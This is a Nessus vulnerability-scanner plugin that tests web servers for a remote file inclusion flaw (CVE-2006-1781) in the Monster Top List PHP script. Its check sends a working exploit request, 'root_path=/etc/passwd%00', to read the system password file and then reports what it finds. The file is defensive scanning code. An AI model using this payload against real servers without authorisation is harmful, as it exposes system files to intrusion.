#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#

# Changes by Tenable:
# - Revised plugin title (3/15/10)

include("compat.inc");

if (description) {
  script_id(21309);
  script_version("$Revision: 1.14 $");
  script_bugtraq_id(17546);
  script_osvdb_id(24650);
  script_cve_id("CVE-2006-1781");

  script_name(english:"Monster Top List sources/functions.php root_path Parameter Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Monster Top List, a site rating script
written in PHP. 

The installed version of Monster Top List fails to sanitize user input
to the 'root_path' parameter in sources/functions.php before using it
to include PHP code from other files.  An unauthenticated attacker may
be able to read arbitrary local files or include a file from a remote
host that contains commands which will be executed on the remote host
subject to the privileges of the web server process. 

This flaw is only exploitable if PHP's 'register_globals' is enabled." );
 script_set_attribute(attribute:"see_also", value:"http://pridels.blogspot.com/2006/04/monstertoplist.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/12");
 script_cvs_date("$Date: 2015/09/24 21:17:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_summary(english:"Checks for file includes in sources/functions.php");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = list_uniq(make_list("/toplist", cgi_dirs()));
else dirs = make_list(cgi_dirs());

# Loop through CGI directories.
foreach dir (dirs) {
  # Try to exploit the flaw in sources/functions.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/sources/functions.php?",
      "root_path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or "Failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but passing 
      #     remote URLs might still work.
      egrep(string:res, pattern:"Warning.+/etc/passwd\0sources/func_output\.php.+failed to open stream")
    
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) content = res;

    if (content){
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
     );
     security_hole(port:port, extra:report);
    }

    security_hole(port:port);
    exit(0);
  }
}
